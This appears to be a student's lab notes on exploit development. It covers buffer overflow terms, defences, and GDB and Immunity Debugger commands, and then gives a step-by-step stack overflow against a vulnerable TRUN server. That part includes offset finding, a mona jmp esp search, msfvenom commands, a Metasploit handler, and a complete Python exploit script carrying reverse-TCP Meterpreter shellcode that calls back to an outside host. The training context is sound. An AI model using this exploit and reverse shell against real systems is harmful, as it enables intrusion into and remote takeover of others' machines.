wiremask.eu to get a string for buffer overflow

Buffer Overflow Terms 
  Heap || Memory that can be allocated and deallocated
  Stack || A contiguous section of memory used for passing arguments
  Registers || Storage elements as close as possible to the central processing unit (CPU)
  Instruction Pointer (IP) || a.k.a Program Counter (PC), contains the address of next instruction to be executed
  Stack Pointer (SP) || Contains the address of the next available space on the stack
  Base Pointer (BP) || The base of the stack
  Function || Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
  Shellcode || The code that is executed once an exploit successfully takes advantage of a vulnerability

Buffer Overflow Defenses
  Non executable (NX) stack
  Address Space Layout Randomization (ASLR) -- randomize the location so it cant all be over written
  Data Execution Prevention (DEP)
  Stack Canaries -- randomized numbers in the stack that when overwritten halt the executable
  Position Independent Executable (PIE)

Tools
  IDA, GHIDRA
  GDB, MONA, IMMUNITY
  BASH, PYTHON

GDB
disass -- disassemble a portion of a program
x/256c $<register> read characters from specific register
break <address> establish a break point

Z:\Strings.exe C:\Users\student\func


 
./func <<<$(echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaa")
Do not have to be in gdb to run this script
./func <<<$(./scriptExDev)


gdb func -- open gdb on func

run -- runs executable

shell -- opens a shell

pdisass getuserinput 

run <<<$(./scriptExDev)

env - gdb ./func
  show env
  unset env LINES
  unset env COLUMNS
  info proc map

msf
use payload/linux/x86/exec
generate -b '\x00' -f python
or
msfvenom -p /linux/x86/exec CMD=whoami -b '\x00' -f python

DOIN IT

https://wiremask.eu/tools/buffer-overflow-pattern-generator/
enter basic one
use return eip in website



this is ran in env - gdb window
after unsetting
find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4



On Windows
Immunity Debugger for a server connection
if bottom right says paussed click the play button
watch CPU first

This script has been made on the linux machine:::(running towards window device)
______________________________________________________________________________________________-
#!/usr/bin/env python

import socket

buf = " "

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ##create ipv4 tcp
s.connect(("192.168.65.10", 9999)) ##Private IP of WinOps and secure server port
print s.recv(1024) ##print to screen what was recieved
s.send(buf) ##send our buf
print s.recv(1024) ##pprint recieved
s.close() ##close the socket
-------------------------------------------------------------------------------------------------
More
buf += "A" * 5000     ##--- adding this breaks it, check the other side of the connection on windows

use wiremask make a 5000 length buffer overflow pattern
double back arrow then play button on immunity debugger
run, and take the EIP -- put in wiremask to get offset

buffer amount of A and 4 Bs at the end, run to verify EIP

back on windows
!mona jmp -r ESP -m "essfunc.dll"
grab top one and make little indian

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.22.124 lport=5555 -b "\x00" -f python
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 5555
exploit
THEN
run the script with the text msfvenom made



#!/usr/bin/env python

import socket

buf = "TRUN /.:/"

buf += "A" * 2003

##625012A0
buf += "\xa0\x12\x50\x62"

buf += "\x90" * 15 ##nop

##msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.22.124 lport=5555 -b "\x00" -f python
 
buf += b"\xdb\xd3\xb8\x4c\xe5\x14\xb2\xd9\x74\x24\xf4\x5b"
buf += b"\x2b\xc9\xb1\x59\x31\x43\x19\x03\x43\x19\x83\xeb"
buf += b"\xfc\xae\x10\xe8\x5a\xa1\xdb\x11\x9b\xdd\x52\xf4"
buf += b"\xaa\xcf\x01\x7c\x9e\xdf\x42\xd0\x13\x94\x07\xc1"
buf += b"\xa0\xd8\x8f\xd8\x49\x13\x67\x50\x90\x1a\x47\xc9"
buf += b"\xe0\x3d\x3b\x10\x35\x9d\x02\xdb\x48\xdc\x43\xad"
buf += b"\x27\x31\x19\xa5\x9a\xdd\x15\xfb\x26\xdc\xf9\x77"
buf += b"\x16\xa6\xae\x02\x57\x22\x1d\x0c\x88\x41\xc5\x2e"
buf += b"\x78\xde\xbe\x36\x79\x33\xbb\x8e\x0d\x8f\xf5\xef"
buf += b"\xa7\x64\xc1\x84\x39\xac\x1b\x5b\x95\x91\x93\x56"
buf += b"\xe7\xd6\x14\x89\x92\x2c\x67\x34\xa5\xf7\x15\xe2"
buf += b"\x20\xe7\xbe\x61\x92\xc3\x3f\xa5\x45\x80\x4c\x02"
buf += b"\x01\xce\x50\x95\xc6\x65\x6c\x1e\xe9\xa9\xe4\x64"
buf += b"\xce\x6d\xac\x3f\x6f\x34\x08\x91\x90\x26\xf4\x4e"
buf += b"\x35\x2d\x17\x98\x49\xce\xe7\xa5\x17\x58\x2b\x68"
buf += b"\xa8\x98\x23\xfb\xdb\xaa\xec\x57\x74\x86\x65\x7e"
buf += b"\x83\x9f\x62\x81\x5b\x27\xe2\x7f\x5c\x57\x2a\x44"
buf += b"\x08\x07\x44\x6d\x31\xcc\x94\x92\xe4\x78\x9f\x04"
buf += b"\x0d\x4e\x89\xa8\x79\xac\xb5\x45\xc9\x39\x53\x35"
buf += b"\x7d\x69\xcc\xf6\x2d\xc9\xbc\x9e\x27\xc6\xe3\xbf"
buf += b"\x47\x0d\x8c\x2a\xa8\xfb\xe4\xc2\x51\xa6\x7f\x72"
buf += b"\x9d\x7d\xfa\xb4\x15\x77\xfa\x7b\xde\xf2\xe8\x6c"
buf += b"\xb9\xfc\xf0\x6c\x2c\xfc\x9a\x68\xe6\xab\x32\x73"
buf += b"\xdf\x9b\x9c\x8c\x0a\x98\xdb\x73\xcb\xa8\x90\x42"
buf += b"\x59\x94\xce\xaa\x8d\x14\x0f\xfd\xc7\x14\x67\x59"
buf += b"\xbc\x47\x92\xa6\x69\xf4\x0f\x33\x92\xac\xfc\x94"
buf += b"\xfa\x52\xda\xd3\xa4\xad\x09\x60\xa2\x51\xcf\x4f"
buf += b"\x0b\x39\x2f\xd0\xab\xb9\x45\xd0\xfb\xd1\x92\xff"
buf += b"\xf4\x11\x5a\x2a\x5d\x39\xd1\xbb\x2f\xd8\xe6\x91"
buf += b"\xee\x44\xe6\x16\x2b\x77\x9d\x57\xcc\x78\x62\x7e"
buf += b"\xa9\x79\x62\x7e\xcf\x46\xb4\x47\xa5\x89\x04\xfc"
buf += b"\xb6\xbc\x29\x55\x5d\xbe\x7e\xa5\x74"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ##create ipv4 tcp
s.connect(("192.168.65.10", 9999)) ##Private IP of WinOps and secure server port
print s.recv(1024) ##print to screen what was recieved
s.send(buf) ##send our buf
print s.recv(1024) ##pprint recieved
s.close() ##close the socket


